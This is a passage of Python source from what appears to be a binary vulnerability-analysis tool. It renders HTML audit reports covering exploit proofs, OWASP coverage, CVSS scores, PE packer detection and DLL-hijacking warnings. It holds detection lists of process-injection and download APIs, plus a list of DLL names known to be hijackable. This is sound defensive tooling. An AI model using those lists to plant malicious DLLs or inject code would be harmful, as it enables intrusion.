    legend = (f'<span class="cfg-lg"><i style="background:#30a46c"></i>{_esc(T["taken"])}</span>'
              f'<span class="cfg-lg"><i style="background:#8b95a1"></i>{_esc(T["fall"])}</span>'
              f'<span class="cfg-lg"><i style="background:#4aa3ff"></i>{_esc(T["jump"])}</span>')
    # transform inicial: coloca el grafo desde arriba-izquierda con un margen (visible sin JS)
    minx = min((n["x"] for n in nodes.values()), default=0)
    init = f'translate({20 - minx:.0f},20)'
    # detalles por bloque para el panel de inspeccion (instrucciones completas + what-if)
    info = {nid: {"addr": nodes[nid]["addr"],
                  "insns": [op.get("txt", "") for op in nodes[nid]["insns"]],
                  "note": nodes[nid].get("note", ""),
                  "state": nodes[nid].get("state", "")} for nid in order}
    tip = ("Pulsa un bloque para ver sus instrucciones y que decide el salto."
           if lang == "es" else "Click a block to see its instructions and what its jump decides.")
    js = _CFG_JS.replace("__CFGW__", str(W)).replace(
        "__CFGINFO__", _json.dumps(info, ensure_ascii=False).replace("</", "<\\/"))
    return (f'<h2 data-i18n="cfg_graph" id="sec-cfg"></h2>'
            f'<p class="mut" style="font-size:12px;margin:-4px 0 8px">{_esc(T["func"])} '
            f'<code>{_esc(cfg.func)}</code> &middot; {_esc(T["hint"])} {legend} '
            f'<button class="ctl cfg-reset" onclick="cfgReset()">{_esc(T["reset"])}</button></p>'
            f'<div class="cfgflex"><div class="cfgwrap"><svg id="cfgsvg"><defs>'
            f'<marker id="ah" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">'
            f'<path d="M0,0 L7,3 L0,6 Z" fill="context-stroke"/></marker></defs>'
            f'<g id="cfgvp" transform="{init}">{edges_svg}{nodes_svg}</g></svg></div>'
            f'<div id="cfginfo" class="cfginfo"><p class="mut">{_esc(tip)}</p></div></div>'
            f'<script>{js}</script>')


def _auto_summary(binary: str, findings, mit: dict, lang: str) -> str:
    """Resumen ejecutivo COHERENTE y profesional, derivado de los hechos (no de la narracion del
    modelo, que en modelos pequenos puede contradecirse). Bilingue."""
    name = _os_basename(binary)
    sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    fs = sorted(findings, key=lambda x: sev_rank.get(x.severity, 9))
    total = len(fs)
    verified = sum(1 for f in fs if f.verdict == "verified")
    vexp = next((f for f in fs if f.verdict == "verified"
                 and "ret2" in (f.title + (f.evidence or "")).lower()), None)
    def mstate(k):
        v = mit.get(k)
        return "?" if v is None else (("ON" if v else "OFF") if isinstance(v, bool) else str(v).upper())
    protec = f"NX {mstate('NX')}, PIE {mstate('PIE')}, Canary {mstate('Canary')}, RELRO {mstate('RELRO')}"
    arch = mit.get("Arch") or "?"
    grounded = sum(1 for f in fs if f.verdict == "grounded")
    unver = sum(1 for f in fs if f.verdict == "unverified")
    top = "; ".join(f.title for f in fs[:3]) or ("sin hallazgos" if lang == "es" else "no findings")
    if lang == "es":
        p = [f"Binario **{name}** ({arch}). Protecciones: {protec}. "
             f"**{total} hallazgos**: {verified} **verificados** (probados por ejecucion o "
             f"alcanzabilidad), {grounded} grounded (evidencia estatica, explotabilidad NO probada)"
             + (f", {unver} sin verificar" if unver else "") + "."]
        if vexp:
            m = _re_mod.search(r"offset\s*=\s*(\d+)", vexp.evidence or "")
            mw = _re_mod.search(r"win\s*=\s*(0x[0-9a-fA-F]+)", (vexp.location or "") + (vexp.evidence or ""))
            det = (f" (offset={m.group(1)}" if m else "") + (f", win={mw.group(1)})" if mw and m else (")" if m else ""))
            p.append(f"Se construyo y ejecuto un exploit ret2win en un sandbox Docker aislado y "
                     f"**alcanzo el objetivo**{det}: la evidencia es la salida real de esa ejecucion "
                     f"(ver 'Prueba de explotacion'), no una afirmacion.")
        p.append(f"Mas severos: {top}.")
        p.append("Metodologia: cada afirmacion esta respaldada por la salida del oraculo que la "
                 "produjo (ver 'Rastro de evidencia'). Los hallazgos 'grounded' son candidatos con "
                 "evidencia estatica: su explotabilidad no se ha probado y debe confirmarse.")
    else:
        p = [f"Binary **{name}** ({arch}). Protections: {protec}. "
             f"**{total} findings**: {verified} **verified** (proven by execution or reachability), "
             f"{grounded} grounded (static evidence, exploitability NOT proven)"
             + (f", {unver} unverified" if unver else "") + "."]
        if vexp:
            m = _re_mod.search(r"offset\s*=\s*(\d+)", vexp.evidence or "")
            mw = _re_mod.search(r"win\s*=\s*(0x[0-9a-fA-F]+)", (vexp.location or "") + (vexp.evidence or ""))
            det = (f" (offset={m.group(1)}" if m else "") + (f", win={mw.group(1)})" if mw and m else (")" if m else ""))
            p.append(f"A ret2win exploit was built and executed in an isolated Docker sandbox and "
                     f"**reached the goal**{det}: the evidence is the real output of that run (see "
                     f"'Exploitation proof'), not a claim.")
        p.append(f"Most severe: {top}.")
        p.append("Methodology: every statement is backed by the output of the oracle that produced "
                 "it (see 'Evidence trail'). 'grounded' findings are candidates with static "
                 "evidence: their exploitability is not proven and must be confirmed.")
    return "\n\n".join(p)


def _owasp_html(findings, lang: str) -> str:
    """OWASP Desktop Top 10 coverage table (methodology phase 9): what was found AND what was
    reviewed with nothing found. Reuses the same conservative mapping as the markdown report."""
    if not findings:
        return ""
    from .render import owasp_desktop_coverage
    es = lang != "en"
    cov = owasp_desktop_coverage(findings)
    head = "OWASP Desktop Top 10: cobertura" if es else "OWASP Desktop Top 10: coverage"
    intro = ("Mapeo de hallazgos al marco OWASP Desktop App Security Top 10 (metodologia Fase 9). "
             "Solo se marca 'revisado, sin hallazgo' lo que binoracle examina de verdad; el resto "
             "se marca 'no evaluado' (fuera del alcance del analisis actual)." if es else
             "Findings mapped to the OWASP Desktop App Security Top 10 (methodology phase 9). Only "
             "what binoracle actually examines is marked 'reviewed, none found'; the rest is marked "
             "'not assessed' (outside the current analysis scope).")
    c_cat, c_st, c_f = (("Categoria", "Estado", "Hallazgos") if es else ("Category", "Status", "Findings"))
    with_f = "con hallazgos" if es else "findings"
    none_f = "revisado, sin hallazgo" if es else "reviewed, none found"
    na_f = "no evaluado (fuera de alcance)" if es else "not assessed (out of scope)"
    rows = ""
    for cid, name, hits, covered in cov:
        if hits:
            det = _esc("; ".join(dict.fromkeys(hits)))
            st = f'<b style="color:#d9822b">{with_f}</b>'
        elif covered:
            det = "-"; st = f'<span style="color:#30a46c">{none_f}</span>'
        else:
            det = "-"; st = f'<span class="mut">{na_f}</span>'
        rows += f'<tr><td>{cid} {_esc(name)}</td><td>{st}</td><td>{det}</td></tr>'
    return (f'<h2 id="sec-owasp">{_esc(head)}</h2><p class="sechelp">{_esc(intro)}</p>'
            f'<table class="owasp" style="width:100%;border-collapse:collapse">'
            f'<thead><tr><th style="text-align:left">{c_cat}</th><th style="text-align:left">{c_st}</th>'
            f'<th style="text-align:left">{c_f}</th></tr></thead><tbody>{rows}</tbody></table>')


def _toc(lang: str, has) -> str:
    """Indice navegable del informe: solo las secciones presentes, con enlace a su ancla."""
    T = {"es": {"t": "Indice", "summary": "Resumen ejecutivo", "proof": "Prueba de explotacion",
                "exploit": "Exploit paso a paso", "dec": "Decompilacion anotada",
                "cfg": "Grafo de flujo interactivo",
                "find": "Hallazgos", "owasp": "OWASP Desktop Top 10", "mit": "Mitigaciones y remediacion",
                "chain": "Cadena de explotacion", "xchain": "Analizador de cadenas (grafo)",
                "exploitplan": "Esquema de explotacion",
                "surface": "Superficie de ataque", "refs": "Referencias", "trail": "Rastro de evidencia"},
         "en": {"t": "Contents", "summary": "Executive summary", "proof": "Exploitation proof",
                "exploit": "Exploit step by step", "dec": "Annotated decompilation",
                "cfg": "Interactive control-flow graph",
                "find": "Findings", "owasp": "OWASP Desktop Top 10", "mit": "Mitigations & remediation",
                "chain": "Exploitation chain", "xchain": "Chain analyzer (graph)",
                "exploitplan": "Exploitation schema",
                "surface": "Attack surface", "refs": "References", "trail": "Evidence trail"}}[lang if lang in ("es", "en") else "es"]
    order = [("summary", "sec-summary"), ("proof", "sec-proof"), ("exploit", "sec-exploit"),
             ("dec", "sec-dec"), ("cfg", "sec-cfg"), ("find", "sec-find"), ("owasp", "sec-owasp"),
             ("mit", "sec-mit"),
             ("chain", "sec-chain"), ("xchain", "sec-xchain"), ("exploitplan", "sec-exploitplan"),
             ("surface", "sec-surface"),
             ("refs", "sec-refs"), ("trail", "sec-trail")]
    items = "".join(f'<li><a href="#{aid}">{_esc(T[key])}</a></li>'
                    for key, aid in order if has.get(key))
    return (f'<nav class="toc"><div class="toc-t">{_esc(T["t"])}</div><ol class="toc-l">{items}</ol></nav>')


def _trail_kind(tool: str, source: str, data: str, lang: str = "es"):
    """Clasifica una entrada del rastro por TECNICA (grounding): sandbox/ejecucion (prueba fuerte),
    simbolica (angr), dinamica (debugger/LD_PRELOAD), o estatica (r2/ELF). Devuelve (etiqueta, color)."""
    es = lang == "es"
    blob = f"{tool} {source} {data}".lower()
    if any(k in blob for k in ("sandbox", "docker", "pwntools", "try_ret2win", "autopoc", "autorop",
                               "autolibc", "autopie", "autoheap", "binorace", "shell", "uid=")):
        return ("ejecucion/sandbox" if es else "execution/sandbox", "#30a46c")
    if any(k in blob for k in ("angr", "symbolic", "reachable", "alcanzab", "ejecucion simbolica")):
        return ("simbolica (angr)" if es else "symbolic (angr)", "#8e4ec6")
    if any(k in blob for k in ("ld_preload", "strace", "ltrace", "debugger", "gdb", "dynamic",
                               "runtime", "stop reason")):
        return ("dinamica" if es else "dynamic", "#f5a623")
    return ("estatica" if es else "static", "#5b8def")


def _evidence_html(ev: str) -> str:
    """Render finding evidence as a labelled terminal block, with the oracle sources it
    came from shown as chips and a colour cue for angr/debugger-proven evidence."""
    import re as _re
    ev = ev or ""
    srcs = list(dict.fromkeys(_re.findall(r"\[([^\]\n]+)\]", ev)))
    chips = "".join(f'<span class="evsrc">{_esc(s)}</span>' for s in srcs)
    proven = ("reachable" in ev.lower()) or ("angr" in ev.lower()) or ("stop reason" in ev.lower())
    dot = "#30a46c" if proven else "#5b8def"
    tag = "probada por oracle" if proven else "evidencia estatica"
    return (f'<div class="evbox"><div class="evbar"><span class="evdot" style="background:{dot}"></span>'
            f'<span class="evlabel">evidencia real</span><span class="evtag">{tag}</span>'
            f'{("<span class=evchips>"+chips+"</span>") if chips else ""}</div>'
            f'<pre class="evpre">{_esc(ev) or "(sin evidencia)"}</pre></div>')


def _parse_mitigations(triage) -> dict:
    """Pull NX/PIE/Canary/RELRO/arch out of the checksec triage section, if present. Tambien
    saca `bintype`/`signed` de la seccion 'radare2 binary info' (iI): son las mismas que decide
    si el panel debe mostrar mitigaciones ELF (NX/PIE/RELRO) o PE (ASLR/DEP/CFG/Authenticode) --
    ver _pe_mitigations()."""
    m = {"NX": None, "PIE": None, "Canary": None, "RELRO": None, "Arch": None,
         "bintype": None, "signed": None}
    if triage is None:
        return m
    for title, source, text in triage.sections:
        blob = f"{title}\n{source}\n{text}".lower()
        if "checksec" in blob or "mitig" in blob or "nx" in blob:
            for line in text.splitlines():
                low = line.lower()
                if "nx" in low and m["NX"] is None:
                    m["NX"] = "false" not in low and "nx_off" not in low
                if ("pie" in low or "pic" in low) and m["PIE"] is None:
                    m["PIE"] = "true" in low and "false" not in low.split(":")[-1]
                if "canary" in low and m["Canary"] is None:
                    m["Canary"] = "true" in low and "false" not in low.split(":")[-1]
                if "relro" in low and m["RELRO"] is None:
                    m["RELRO"] = "full" if "full" in low else ("partial" if "partial" in low else "none")
                ma = re.search(r"arch:\s*([a-z0-9_\- ]+)", low)
                if ma and m["Arch"] is None:
                    m["Arch"] = ma.group(1).strip()
        if "binary info" in blob or title.lower() == "file / elf header":
            for line in text.splitlines():
                low = line.strip().lower()
                if low.startswith("bintype") and m["bintype"] is None:
                    m["bintype"] = low.split()[-1]
                if low.startswith("signed") and m["signed"] is None:
                    m["signed"] = low.split()[-1] == "true"
    return m


# Bits de IMAGE_OPTIONAL_HEADER.DllCharacteristics (PE) relevantes para explotacion. `nx`/`pic`
# de checksec ya cubren DEP/ASLR razonablemente via heuristica de r2, pero CFG (Control Flow
# Guard, el equivalente PE de CFI: valida cada `call`/`jmp` indirecto contra una bitmap de
# destinos validos) no lo expone ningun campo de checksec -- solo esta en DllCharacteristics.
_PE_DYNAMIC_BASE = 0x0040   # ASLR
_PE_NX_COMPAT = 0x0100      # DEP
_PE_GUARD_CF = 0x4000       # CFG


# Fase 2 de una auditoria PE: clasificar por lo que el binario PUEDE hacer (capacidad), no por lo
# que creemos que esta mal, antes de mirar ninguna funcion. Nombres de API Win32 reales, no
# sustrings sueltos (evita que "Process32First"/"Process32Next" -- enumeracion, no ejecucion --
# cuenten como "proceso" solo por contener "Process").
_PE_CAPABILITIES = [
    # nombres con prefijo "=": coincidencia EXACTA, no prefijo. Los BSD-socket clasicos (send,
    # recv, connect...) son demasiado cortos/genericos para prefix-match sin falsos positivos --
    # confirmado con un binario real: "SendMessageA" (mensajeria de ventanas, user32, nada que
    # ver con red) caia en "Red" solo por empezar por "send".
    ("red", ("es", "Red"), ("en", "Network"), (
        "InternetOpen", "InternetConnect", "InternetReadFile", "InternetWriteFile",
        "HttpSendRequest", "HttpOpenRequest", "WinHttpOpen", "WinHttpConnect",
        "WinHttpSendRequest", "WSAStartup", "WSASocket", "=socket", "=connect", "=send",
        "=recv", "=bind", "=listen", "=accept", "URLDownloadToFile")),
    ("proceso", ("es", "Proceso / ejecucion"), ("en", "Process / execution"), (
        "CreateProcess", "WinExec", "ShellExecute", "CreateRemoteThread", "CreateThread",
        "OpenProcess", "TerminateProcess", "VirtualAllocEx", "WriteProcessMemory",
        "QueueUserAPC", "NtCreateThreadEx", "LoadLibrary", "GetProcAddress")),
    ("privilegios", ("es", "Privilegios / token"), ("en", "Privileges / token"), (
        "AdjustTokenPrivileges", "LookupPrivilegeValue", "OpenProcessToken", "OpenThreadToken",
        "DuplicateToken", "ImpersonateLoggedOnUser", "SetTokenInformation")),
    ("cripto", ("es", "Criptografia"), ("en", "Cryptography"), (
        "CryptAcquireContext", "CryptCreateHash", "CryptHashData", "CryptEncrypt",
        "CryptDecrypt", "CryptGenKey", "CryptDeriveKey", "BCryptOpenAlgorithmProvider",
        "BCryptEncrypt", "BCryptDecrypt", "NCryptOpenStorageProvider")),
    ("registro", ("es", "Registro"), ("en", "Registry"), (
        "RegCreateKey", "RegSetValue", "RegOpenKey", "RegDeleteKey", "RegDeleteValue",
        "RegQueryValue", "RegEnumKey")),
    ("ficheros", ("es", "Ficheros"), ("en", "Files"), (
        "CreateFile", "WriteFile", "ReadFile", "DeleteFile", "MoveFile", "CopyFile",
        "SetFileAttributes", "GetTempPath", "GetTempFileName")),
    ("bd", ("es", "Bases de datos"), ("en", "Databases"), (
        "SQLConnect", "SQLDriverConnect", "SQLExecDirect", "SQLExecute", "SQLPrepare",
        "SQLGetData", "SQLFetch", "SQLBindParameter", "sqlite3_open", "sqlite3_exec",
        "sqlite3_prepare")),
]


def _pe_imports_via_pefile(binary: str) -> set:
    """Fallback de Fase 0: si r2 (ii/iij) no da imports (PE raro, empaquetado, o el parser de r2
    se atraganta), NO hay que asumir que el binario carece de tabla de importaciones -- probar
    pefile antes de concluir nada. Devuelve el set de nombres de funcion importados, vacio si
    tambien falla (best-effort, igual que el resto de oraculos de este informe)."""
    try:
        import pefile
        pe = pefile.PE(binary, fast_load=True)
        pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_IMPORT"]])
        names = set()
        for entry in getattr(pe, "DIRECTORY_ENTRY_IMPORT", []):
            for imp in entry.imports:
                nm = imp.name
                if not nm:
                    continue
                if isinstance(nm, bytes):
                    nm = nm.decode("latin-1", errors="replace")
                names.add(nm)
        return names
    except Exception:
        return set()


def _pe_capability_map(triage, binary: str = None) -> dict:
    """Clasifica los imports del binario por capacidad (red/proceso/privilegios/cripto/registro/
    ficheros/bd), Fase 2 de una auditoria PE: dice DONDE merece la pena mirar antes de leer
    ninguna funcion. Solo tiene sentido para bintype=pe (los nombres son API Win32); se llama solo
    desde ahi. Devuelve {cat_key: [nombres de funcion encontrados]}, categorias vacias omitidas."""
    if triage is None:
        return {}
    imports_text = ""
    for title, source, text in triage.sections:
        if "import" in title.lower():
            imports_text += text + "\n"
    names = set()
    for line in imports_text.splitlines():
        parts = line.split()
        if not parts:
            continue
        cand = parts[-1]
        if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", cand):
            names.add(cand)
    if not names and binary:
        names = _pe_imports_via_pefile(binary)
    if not names:
        return {}
    def _match(name: str, pattern: str) -> bool:
        low = name.lower()
        if pattern.startswith("="):
            return low == pattern[1:].lower()
        return low.startswith(pattern.lower())
    out = {}
    for key, _es, _en, patterns in _PE_CAPABILITIES:
        hits = sorted({n for n in names for p in patterns if _match(n, p)})
        if hits:
            out[key] = hits
    return out


# Nombres de seccion que dejan packers/protectores conocidos (Fase 0: si esta empaquetado, todo
# lo demas cambia -- hay que desempaquetar antes de que el resto del analisis tenga sentido).
_PACKER_SECTION_SIGS = {
    "upx0": "UPX", "upx1": "UPX", "upx2": "UPX", ".aspack": "ASPack", ".adata": "ASPack",
    ".themida": "Themida/WinLicense", ".vmp0": "VMProtect", ".vmp1": "VMProtect",
    ".petite": "Petite", ".mpress1": "MPRESS", ".mpress2": "MPRESS", ".enigma1": "Enigma",
    ".enigma2": "Enigma", ".pec1": "PECompact", ".pec2": "PECompact",
}
_ENTROPY_PACKED_THRESHOLD = 7.0
# Fase 0: senal adicional de empaquetado -- un binario grande con MUY pocas funciones detectadas
# es tipico del stub de un packer (el programa real esta comprimido/cifrado como datos, r2 no ve
# codigo ahi). Umbrales empiricos: por debajo de este tamano no es significativo (cualquier
# programa pequeno tiene pocas funciones de forma legitima).
_PACKING_MIN_SIZE_FOR_FNCOUNT = 200_000
_PACKING_LOW_FNCOUNT = 30


def _pe_packing_check(binary: str) -> dict:
    """Fase 0: entropia por seccion (umbral empirico ~7.0 = probablemente comprimido/cifrado) +
    nombres de seccion de packers conocidos + recuento de funciones detectadas (afl~?) anormalmente
    bajo para el tamano del binario. Si el binario esta empaquetado, el resto del analisis estatico
    (imports, cadenas, funciones) ve el STUB del packer, no el programa real -- hay que avisar de
    esto ANTES que de cualquier otra cosa. Best-effort: {} si falla o no aplica."""
    try:
        from ..oracles.r2session import get as _r2get
        import json as _json, os as _os
        r = _r2get(binary)
        if r is None:
            return {}
        secs = _json.loads(r.cmd("iSj entropy") or "[]")
        high = []
        sigs = []
        for s in secs:
            name = (s.get("name") or "").strip()
            try:
                ent = float(s.get("entropy", 0) or 0)
            except (TypeError, ValueError):
                ent = 0.0
            if ent >= _ENTROPY_PACKED_THRESHOLD:
                high.append((name, ent))
            packer = _PACKER_SECTION_SIGS.get(name.lower())
            if packer:
                sigs.append((name, packer))
        low_fncount = None
        try:
            size = _os.path.getsize(binary)
            nfcn = int((r.cmd("aflc") or "0").strip())
            if size >= _PACKING_MIN_SIZE_FOR_FNCOUNT and 0 < nfcn < _PACKING_LOW_FNCOUNT:
                low_fncount = (nfcn, size)
        except Exception:
            low_fncount = None
        if not high and not sigs and not low_fncount:
            return {}
        out = {"high_entropy": high, "packer_sections": sigs}
        if low_fncount:
            out["low_fncount"] = low_fncount
        return out
    except Exception:
        return {}


def _pe_dll_characteristics(binary: str) -> dict:
    """Lee IMAGE_OPTIONAL_HEADER.DllCharacteristics via r2 (iHj) y decodifica los bits de
    mitigacion. Solo tiene sentido para bintype=pe; devuelve {} si algo falla (best-effort,
    igual que el resto de oraculos de este informe)."""
    try:
        from ..oracles.r2session import get as _r2get
        import json as _json
        r = _r2get(binary)
        if r is None:
            return {}
        raw = _json.loads(r.cmd("iHj") or "{}").get("header", "")
        m = re.search(r"DllCharacteristics\s*:\s*(0x[0-9a-fA-F]+)", raw)
        if not m:
            return {}
        bits = int(m.group(1), 16)
        return {"ASLR": bool(bits & _PE_DYNAMIC_BASE),
                "DEP": bool(bits & _PE_NX_COMPAT),
                "CFG": bool(bits & _PE_GUARD_CF)}
    except Exception:
        return {}


# Checklist base de auditoria PE: "DLL hijacking - se utilizan rutas relativas?". Windows carga
# estas DLLs por busqueda de nombre (no ruta completa) en varias versiones/contextos, y son las
# reportadas con mas frecuencia en investigaciones publicas de sideloading/hijacking (plantar una
# DLL maliciosa con este nombre en el directorio del ejecutable para que cargue antes que la
# legitima del sistema). No es una lista exhaustiva, es una senal de "merece la pena revisar".
_HIJACKABLE_DLLS = {
    "version.dll", "dwmapi.dll", "uxtheme.dll", "winmm.dll", "msimg32.dll", "wtsapi32.dll",
    "dbghelp.dll", "profapi.dll", "cryptbase.dll", "ntmarta.dll", "propsys.dll", "oleacc.dll",
    "secur32.dll", "wow64log.dll", "apphelp.dll", "imageres.dll", "wbemcomn.dll", "amsi.dll",
    "wldp.dll",
}
# Si el binario usa estas APIs para fijar su propia ruta de busqueda de DLLs, se considera
# endurecido frente a hijacking por busqueda de nombre (mitigacion real, no solo teoria).
_DLL_SEARCH_HARDENING_APIS = {"setdlldirectorya", "setdlldirectoryw", "setdefaultdlldirectories"}


def _pe_dll_hijack_check(triage) -> dict:
    """Checklist base: DLL hijacking. Mira los NOMBRES DE DLL de la tabla de imports (no solo las
    funciones) contra una lista de DLLs conocidas por cargarse por busqueda de nombre y ser
    plantadas junto al ejecutable para search-order hijacking. Si el binario ademas usa
    SetDllDirectory/SetDefaultDllDirectories se considera endurecido y no se avisa. Devuelve
    {"dlls": [nombres encontrados]} o {} si no aplica/no hay indicios."""
    if triage is None:
        return {}
    imports_text = ""
    for title, source, text in triage.sections:
        if "import" in title.lower():
            imports_text += text + "\n"
    if not imports_text.strip():
        return {}
    dll_names = set()
    func_names = set()
    for line in imports_text.splitlines():
        parts = line.split()
        if len(parts) < 2:
            continue
        cand_fn = parts[-1]
        cand_dll = parts[-2]
        if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", cand_fn):
            func_names.add(cand_fn.lower())
        if re.match(r"^[A-Za-z0-9_.]+\.dll$", cand_dll, re.I):
            dll_names.add(cand_dll.lower())
    if func_names & _DLL_SEARCH_HARDENING_APIS:
        return {}
    hits = sorted(dll_names & _HIJACKABLE_DLLS)
    return {"dlls": hits} if hits else {}


def _dll_hijack_html(res: dict, lang: str) -> str:
    """Checklist base: aviso de DLL hijacking si el binario importa alguna DLL de busqueda-por-
    nombre conocida sin usar las APIs de endurecimiento de ruta de busqueda."""
    if not res or not res.get("dlls"):
        return ""
    es = lang == "es"
    title = "Posible DLL hijacking" if es else "Possible DLL hijacking"
    dll_list = ", ".join(res["dlls"])
    body = ((f"Importa {dll_list}, que Windows puede cargar por busqueda de nombre (no ruta "
             f"completa), y el binario no llama a SetDllDirectory/SetDefaultDllDirectories para "
             f"fijar su propia ruta de busqueda.") if es else
            (f"Imports {dll_list}, which Windows can load by name search (not a full path), and "
             f"the binary never calls SetDllDirectory/SetDefaultDllDirectories to pin its own "
             f"search path."))
    note = ("Si un atacante puede escribir en el directorio del ejecutable (o en un directorio "
            "anterior en la ruta de busqueda), puede plantar una DLL maliciosa con ese nombre y "
            "conseguir ejecucion de codigo con los privilegios del proceso." if es else
            "If an attacker can write to the executable's directory (or an earlier directory in "
            "the search path), they can plant a malicious DLL with that name and get code "
            "execution with the process's privileges.")
    return (f'<div class="proof" style="border-color:#f5a623;box-shadow:0 0 0 1px rgba(245,166,35,.15)">'
            f'<div class="proof-h" style="background:#1a1408;border-color:#f5a623">'
            f'<span class="proof-ok" style="color:#f5a623">&#9888;</span>'
            f'<span class="proof-t">{_esc(title)}</span></div>'
            f'<div style="padding:10px 13px;color:var(--fg);font-size:13px">{_esc(body)}'
            f'<p class="mut" style="font-size:12px;margin:8px 0 0">{_esc(note)}</p></div></div>')


def _pe_pdb_leak(binary: str) -> dict:
    """Checklist base: filtracion de informacion sensible en strings -- rutas de compilacion. El
    PE Debug Directory (registro CodeView/RSDS) suele embeber la ruta ABSOLUTA al .pdb tal cual
    quedo en la maquina que compilo el binario (revela usuario, estructura de disco, a veces
    nombre de la organizacion). Usa pefile (r2 no expone este directorio). Best-effort: {} si
    falla, no aplica, o el binario fue compilado sin esta info (release limpio)."""
    try:
        import pefile
        pe = pefile.PE(binary, fast_load=True)
        pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_DEBUG"]])
        for d in getattr(pe, "DIRECTORY_ENTRY_DEBUG", []):
            entry = getattr(d, "entry", None)
            path = getattr(entry, "PdbFileName", None) if entry is not None else None
            if not path:
                continue
            if isinstance(path, bytes):
                path = path.rstrip(b"\x00").decode("latin-1", errors="replace")
            path = path.rstrip("\x00")
            if path:
                return {"pdb_path": path}
        return {}
    except Exception:
        return {}


def _pdb_leak_html(res: dict, lang: str) -> str:
    """Checklist base: aviso de fuga de ruta de compilacion (PDB) si el Debug Directory la trae."""
    path = (res or {}).get("pdb_path")
    if not path:
        return ""
    es = lang == "es"
    title = "Ruta de compilacion filtrada (PDB)" if es else "Compilation path leaked (PDB)"
    body = ((f"El Debug Directory del PE embebe la ruta absoluta al simbolo de depuracion: "
             f"{path}") if es else
            (f"The PE Debug Directory embeds the absolute path to the debug symbol: {path}"))
    note = ("Revela la estructura de disco (y a veces el usuario/organizacion) de la maquina que "
            "compilo el binario. Bajo impacto por si solo, pero utilidad para reconocimiento "
            "(nombres de proyecto, rutas de red internas, convenciones de nombrado)." if es else
            "Reveals the disk layout (and sometimes the username/organization) of the build "
            "machine. Low impact on its own, but useful for recon (project names, internal "
            "network paths, naming conventions).")
    return (f'<div class="proof" style="border-color:#5b8def;box-shadow:0 0 0 1px rgba(91,141,239,.15)">'
            f'<div class="proof-h" style="background:#0c1420;border-color:#5b8def">'
            f'<span class="proof-ok" style="color:#5b8def">&#9432;</span>'
            f'<span class="proof-t">{_esc(title)}</span></div>'
            f'<div style="padding:10px 13px;color:var(--fg);font-size:13px">{_esc(body)}'
            f'<p class="mut" style="font-size:12px;margin:8px 0 0">{_esc(note)}</p></div></div>')


_CVSS_SEV_COLOR = {"Critical": "#e5484d", "High": "#f5a623", "Medium": "#e2b53e",
                   "Low": "#5b8def", "None": "#8b95a1"}


def _cvss_html(f, lang: str):
    """(badge, body) CVSS 4.0 de un hallazgo. El vector se asigna por clase de vulnerabilidad y el
    score lo calcula el algoritmo oficial; None -> sin badge (no se inventa)."""
    try:
        from .cvss import cvss_for
        r = cvss_for(f)
    except Exception:
        r = None
    if not r:
        return "", ""
    es = lang == "es"
    if r.base is not None:
        col = _CVSS_SEV_COLOR.get(r.severity, "#8b95a1")
        badge = (f'<span class="cvssb" style="background:{col}" title="{_esc(r.vector)}">'
                 f'CVSS 4.0 {r.base:.1f}</span>')
    else:
        badge = '<span class="cvssb" style="background:#8b95a1">CVSS 4.0</span>'
    mat = {"A": ("verificado (E:A, Attacked)" if es else "verified (E:A, Attacked)"),
           "P": ("grounded (E:P, Proof-of-Concept)" if es else "grounded (E:P, Proof-of-Concept)"),
           "U": ("sin verificar (E:U)" if es else "unverified (E:U)")}[r.exploit_maturity]
    sev_txt = (f"{r.base:.1f} ({r.severity})" if r.base is not None
               else ("score no disponible (instala el paquete `cvss`)" if es
                     else "score unavailable (install the `cvss` package)"))
    note = ("Vector asignado por clase de vulnerabilidad; score calculado por el algoritmo oficial "
            "CVSS 4.0. Madurez de explotacion: " if es else
            "Vector assigned by vulnerability class; score computed by the official CVSS 4.0 "
            "algorithm. Exploit maturity: ") + mat + "."
    body = (f'<h4>CVSS 4.0</h4><div class="cvssbox">'
            f'<div class="cvssrow"><b>{_esc(sev_txt)}</b> '
            f'<span class="cvssmat" style="background:{_CVSS_SEV_COLOR.get(r.severity, "#8b95a1")}">'
            f'E:{r.exploit_maturity}</span></div>'
            f'<code class="cvssvec">{_esc(r.vector)}</code>'
            f'<p class="mut" style="font-size:11.5px;margin:6px 0 0">{_esc(note)}</p></div>')
    return badge, body


def render_chains_page(chains, lang: str = "es") -> str:
    """Pagina HTML autocontenida (con su CSS) SOLO con la seccion del Exploit Chain Analyzer:
    el grafo interactivo con las cadenas verificadas y su prueba. Para la vista en vivo de la web
    (se sirve en un iframe). Si no hay cadenas, muestra un aviso."""
    es = lang == "es"
    head = (f"<!doctype html><html lang='{lang}'><head><meta charset='utf-8'>"
            f"<meta name='viewport' content='width=device-width, initial-scale=1'>"
            f"<style>{_CSS}</style></head><body><main style='padding:16px'>")
    if chains is not None and not getattr(chains, "applicable", True):
        msg = getattr(chains, "note", "") or ""
        return head + f"<p class='mut'>{_esc(msg)}</p></main></body></html>"
    if chains is None or not getattr(chains, "ok", False):
        msg = ("No se pudieron construir cadenas (binario no soportado o sin primitivas)."
               if es else "Could not build chains (unsupported binary or no primitives).")
        return head + f"<p class='mut'>{_esc(msg)}</p></main></body></html>"
    section = _exploit_html(chains, lang)
    # rellena el titulo de la seccion (data-i18n) para la vista standalone (sin el JS del informe)
    title = _I18N.get(lang, _I18N["es"]).get("exploit_chains", "Exploit chains")
    section = section.replace('data-i18n="exploit_chains" id="sec-xchain"></h2>',
                              f'data-i18n="exploit_chains" id="sec-xchain">{_esc(title)}</h2>')
    return head + section + "</main></body></html>"


def render_exploit_page(plan, binary: str = "target", lang: str = "es", intro_md: str = "") -> str:
    """Pagina autocontenida del apartado 'CVE -> exploit funcional': dada la info de una CVE/vuln y
    un binario, muestra el esquema de explotacion, el estado VERIFICADO (si la cadena se ejecuto en
    sandbox) y el exploit DESARROLLADO (script pwntools) con boton de descarga. Para la vista en vivo
    de la web (iframe)."""
    import base64, os
    es = lang == "es"
    name = _esc(os.path.basename(binary) if binary else "target")
    head = (f"<!doctype html><html lang='{lang}'><head><meta charset='utf-8'>"
            f"<meta name='viewport' content='width=device-width, initial-scale=1'>"
            f"<style>{_CSS}</style></head><body><main style='padding:16px'>")
    if plan is None or not getattr(plan, "ok", False):
